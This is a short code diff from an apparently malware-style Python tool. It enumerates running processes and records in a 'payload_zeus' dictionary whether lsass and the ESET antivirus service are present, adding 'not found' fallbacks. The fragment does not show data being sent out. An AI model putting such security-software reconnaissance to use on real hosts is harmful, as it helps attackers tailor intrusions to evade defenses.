@@ -15,11 +15,14 @@ def OperatingSystem(payload_zeus):
           pinfo = proc.as_dict(attrs=['name'])
       except psutil.NoSuchProcess:
           pass
-      else:
-        if "lsass" in str(pinfo):
-            payload_zeus["lsass"] = "Activated"
-        if "ekrn" in str(pinfo):
-          payload_zeus["eset"] = "ESET"
+      if "lsass" in str(pinfo):
+        payload_zeus["lsass"] = "Activated"
+      if "ekrn" in str(pinfo):
+        payload_zeus["antivirus"] = "ESET"
+  if not "lsass" in str(payload_zeus): 
+    payload_zeus["lsass"] = "Not found or desactivated"
+  if not "antivirus" in str(payload_zeus):
+    payload_zeus["antivirus"] =  "Not found or desactivated"  
   return payload_zeus
 
   
